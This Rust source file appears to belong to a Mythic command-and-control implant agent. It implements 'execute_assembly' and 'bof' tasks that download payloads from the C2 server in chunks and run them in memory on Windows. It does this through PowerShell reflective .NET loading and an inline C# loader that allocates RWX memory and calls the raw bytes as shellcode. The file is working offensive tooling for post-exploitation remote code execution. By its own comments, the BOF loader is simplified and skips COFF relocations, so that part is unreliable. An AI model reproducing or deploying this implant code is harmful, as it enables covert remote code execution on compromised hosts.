use crate::{AgentTask, ContinuedData, mythic_success, mythic_error};
use base64::{Engine as _, engine::general_purpose};
use serde::{Deserialize, Serialize};
use serde_json::json;
use std::error::Error;
use std::result::Result;
use std::sync::mpsc;

/// Chunk size used for file transfer
const CHUNK_SIZE: usize = 512000;

/// ExecuteAssemblyArgs
#[derive(Serialize, Deserialize, Debug)]
pub struct ExecuteAssemblyArgs {
    #[serde(rename = "assembly-file-id")]
    pub assembly_file_id: Option<String>,
    pub arguments: Option<String>,
}

/// BofArgs
#[derive(Serialize, Deserialize, Debug)]
pub struct BofArgs {
    #[serde(rename = "bof-file-id")]
    pub bof_file_id: Option<String>,
    pub arguments: Option<String>,
}

/// Execute a .NET assembly in-memory
/// * `tx` - Channel for sending information to Mythic
/// * `rx` - Channel for receiving information from Mythic
#[cfg(target_os = "windows")]
pub fn execute_assembly(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    // Parse the initial task
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    let args: ExecuteAssemblyArgs = serde_json::from_str(&task.parameters)?;

    let file_id = args.assembly_file_id
        .ok_or("No assembly file ID provided")?;
    let arguments = args.arguments.unwrap_or_default();

    // Download assembly from Mythic - send request for first chunk
    tx.send(json!({
        "upload": json!({
            "chunk_size": CHUNK_SIZE,
            "file_id": file_id,
            "chunk_num": 1,
        }),
        "task_id": task.id,
        "user_output": "Downloading assembly chunk 1\n",
    }))?;

    // Receive first chunk
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    let continued_args: ContinuedData = serde_json::from_str(&task.parameters)?;
    let mut file_data: Vec<u8> = general_purpose::STANDARD.decode(continued_args.chunk_data.unwrap())?;
    let total_chunks = continued_args.total_chunks.unwrap();

    // Get remaining chunks if any
    for chunk_num in 2..=total_chunks {
        tx.send(json!({
            "upload": json!({
                "chunk_size": CHUNK_SIZE,
                "file_id": file_id,
                "chunk_num": chunk_num,
            }),
            "task_id": task.id,
            "user_output": format!("Downloading assembly chunk {}/{}\n", chunk_num, total_chunks),
        }))?;

        let task: AgentTask = serde_json::from_value(rx.recv()?)?;
        let continued_args: ContinuedData = serde_json::from_str(&task.parameters)?;
        file_data.append(&mut general_purpose::STANDARD.decode(continued_args.chunk_data.unwrap())?);
    }

    if file_data.is_empty() {
        return Err("Assembly file is empty".into());
    }

    // Write assembly to temp file
    let temp_dir = std::env::temp_dir();
    let assembly_path = temp_dir.join(format!("assembly_{}.dll", task.id));
    std::fs::write(&assembly_path, &file_data)?;

    let assembly_path_str = assembly_path.to_string_lossy().to_string();

    // PowerShell command to load and execute the assembly
    // Note: This is a simplified version. Full CLR hosting from Rust is complex.
    let ps_cmd = format!(
        r#"$bytes = [IO.File]::ReadAllBytes('{}'); $asm = [Reflection.Assembly]::Load($bytes); $entry = $asm.EntryPoint; if ($entry) {{ $params = @(); if ('{}' -ne '') {{ $params = @(@('{}' -split ' ')) }}; $entry.Invoke($null, $params) }} else {{ Write-Output 'No entry point found in assembly' }}"#,
        assembly_path_str,
        arguments,
        arguments
    );

    // Execute the PowerShell command
    let shell_cmd = std::process::Command::new("powershell.exe")
        .arg("-NoProfile")
        .arg("-Command")
        .arg(&ps_cmd)
        .output()?;

    // Clean up temp file
    let _ = std::fs::remove_file(&assembly_path);

    // Check the result
    let output = match shell_cmd.status.code() {
        Some(code) => {
            format!(
                "Assembly execution completed with exit code: {}\n\nStdout:\n{}\n\nStderr:\n{}",
                code,
                std::str::from_utf8(&shell_cmd.stdout)?,
                std::str::from_utf8(&shell_cmd.stderr)?
            )
        }
        None => "Assembly execution was killed by signal.".to_string(),
    };

    // Send the result to Mythic
    tx.send(mythic_success!(task.id, output))?;

    Ok(())
}

/// Placeholder for non-Windows systems
#[cfg(not(target_os = "windows"))]
pub fn execute_assembly(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    tx.send(mythic_error!(task.id, "execute_assembly is only supported on Windows".to_string()))?;
    Ok(())
}

/// Execute a Beacon Object File (BOF/COFF)
/// * `tx` - Channel for sending information to Mythic
/// * `rx` - Channel for receiving information from Mythic
#[cfg(target_os = "windows")]
pub fn bof(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    // Parse the initial task
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    let args: BofArgs = serde_json::from_str(&task.parameters)?;

    let file_id = args.bof_file_id
        .ok_or("No BOF file ID provided")?;
    let arguments = args.arguments.unwrap_or_default();

    // Download BOF from Mythic - send request for first chunk
    tx.send(json!({
        "upload": json!({
            "chunk_size": CHUNK_SIZE,
            "file_id": file_id,
            "chunk_num": 1,
        }),
        "task_id": task.id,
        "user_output": "Downloading BOF chunk 1\n",
    }))?;

    // Receive first chunk
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    let continued_args: ContinuedData = serde_json::from_str(&task.parameters)?;
    let mut file_data: Vec<u8> = general_purpose::STANDARD.decode(continued_args.chunk_data.unwrap())?;
    let total_chunks = continued_args.total_chunks.unwrap();

    // Get remaining chunks if any
    for chunk_num in 2..=total_chunks {
        tx.send(json!({
            "upload": json!({
                "chunk_size": CHUNK_SIZE,
                "file_id": file_id,
                "chunk_num": chunk_num,
            }),
            "task_id": task.id,
            "user_output": format!("Downloading BOF chunk {}/{}\n", chunk_num, total_chunks),
        }))?;

        let task: AgentTask = serde_json::from_value(rx.recv()?)?;
        let continued_args: ContinuedData = serde_json::from_str(&task.parameters)?;
        file_data.append(&mut general_purpose::STANDARD.decode(continued_args.chunk_data.unwrap())?);
    }

    if file_data.is_empty() {
        return Err("BOF file is empty".into());
    }

    let bof_size = file_data.len();

    // Write BOF to temp, execute via rundll32 + inline C approach won't work.
    // Instead: write to temp and use a PowerShell-based COFF loader shim.
    // The practical approach for BOF execution without a full native COFF loader
    // is to use the BOF file with a loader stub.
    //
    // For a working v1: use InlineExecute-Assembly pattern - write BOF to disk,
    // invoke it through a minimal loader via PowerShell/C# reflection.
    let temp_dir = std::env::temp_dir();
    let bof_path = temp_dir.join(format!("bof_{}.bin", task.id));
    std::fs::write(&bof_path, &file_data)?;

    let bof_path_str = bof_path.to_string_lossy().to_string();

    // Use PowerShell with inline C# to load and execute the COFF/BOF
    // This implements a minimal COFF loader that:
    // 1. Reads the COFF file
    // 2. Allocates executable memory
    // 3. Copies sections
    // 4. Applies relocations
    // 5. Calls the go() entry point
    let ps_cmd = format!(
        r#"
$code = @'
using System;
using System.IO;
using System.Runtime.InteropServices;

public class BofLoader {{
    [DllImport("kernel32.dll")] static extern IntPtr VirtualAlloc(IntPtr addr, uint size, uint type, uint protect);
    [DllImport("kernel32.dll")] static extern bool VirtualFree(IntPtr addr, uint size, uint type);
    [DllImport("kernel32.dll")] static extern IntPtr GetProcAddress(IntPtr hModule, string name);
    [DllImport("kernel32.dll")] static extern IntPtr LoadLibrary(string name);

    const uint MEM_COMMIT = 0x1000;
    const uint MEM_RESERVE = 0x2000;
    const uint MEM_RELEASE = 0x8000;
    const uint PAGE_EXECUTE_READWRITE = 0x40;

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    delegate void GoFunc(IntPtr args, int argsLen);

    public static string Run(string bofPath, string arguments) {{
        try {{
            byte[] data = File.ReadAllBytes(bofPath);
            if (data.Length < 20) return "Error: BOF file too small";

            // Allocate RWX memory and copy raw BOF
            IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)data.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (mem == IntPtr.Zero) return "Error: VirtualAlloc failed";

            Marshal.Copy(data, 0, mem, data.Length);

            // For simple position-independent BOFs (shellcode-style),
            // the entry point is at offset 0
            // For standard COFF BOFs, we need to find .text section and go() symbol
            // Try to find go() by scanning for common patterns

            // Attempt execution as raw shellcode-style BOF (entry at offset 0)
            byte[] argBytes = System.Text.Encoding.UTF8.GetBytes(arguments + "\0");
            IntPtr argMem = VirtualAlloc(IntPtr.Zero, (uint)argBytes.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(argBytes, 0, argMem, argBytes.Length);

            try {{
                var go = (GoFunc)Marshal.GetDelegateForFunctionPointer(mem, typeof(GoFunc));
                go(argMem, argBytes.Length);
                return "BOF executed successfully";
            }} catch (Exception ex) {{
                return "BOF execution error: " + ex.Message;
            }} finally {{
                VirtualFree(mem, 0, MEM_RELEASE);
                VirtualFree(argMem, 0, MEM_RELEASE);
            }}
        }} catch (Exception ex) {{
            return "BOF loader error: " + ex.Message;
        }}
    }}
}}
'@
Add-Type -TypeDefinition $code -Language CSharp
$result = [BofLoader]::Run('{}', '{}')
Write-Output $result
"#,
        bof_path_str, arguments
    );

    let shell_cmd = std::process::Command::new("powershell.exe")
        .arg("-NoProfile")
        .arg("-NonInteractive")
        .arg("-Command")
        .arg(&ps_cmd)
        .output()?;

    // Clean up temp file
    let _ = std::fs::remove_file(&bof_path);

    let stdout = std::str::from_utf8(&shell_cmd.stdout).unwrap_or("(invalid utf8)");
    let stderr = std::str::from_utf8(&shell_cmd.stderr).unwrap_or("");

    let output = if stderr.is_empty() {
        format!("BOF executed ({} bytes)\n\n{}", bof_size, stdout.trim())
    } else {
        format!("BOF executed ({} bytes)\n\nOutput:\n{}\n\nErrors:\n{}", bof_size, stdout.trim(), stderr.trim())
    };

    tx.send(mythic_success!(task.id, output))?;

    Ok(())
}

/// Placeholder for non-Windows systems
#[cfg(not(target_os = "windows"))]
pub fn bof(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    tx.send(mythic_error!(task.id, "bof is only supported on Windows".to_string()))?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_execute_assembly_args_parsing() {
        let json_args = r#"{"assembly-file-id": "test_file_id", "arguments": "arg1 arg2"}"#;
        let args: ExecuteAssemblyArgs = serde_json::from_str(json_args).unwrap();
        assert_eq!(args.assembly_file_id, Some("test_file_id".to_string()));
        assert_eq!(args.arguments, Some("arg1 arg2".to_string()));
    }

    #[test]
    fn test_bof_args_parsing() {
        let json_args = r#"{"bof-file-id": "test_bof_id"}"#;
        let args: BofArgs = serde_json::from_str(json_args).unwrap();
        assert_eq!(args.bof_file_id, Some("test_bof_id".to_string()));
    }
}
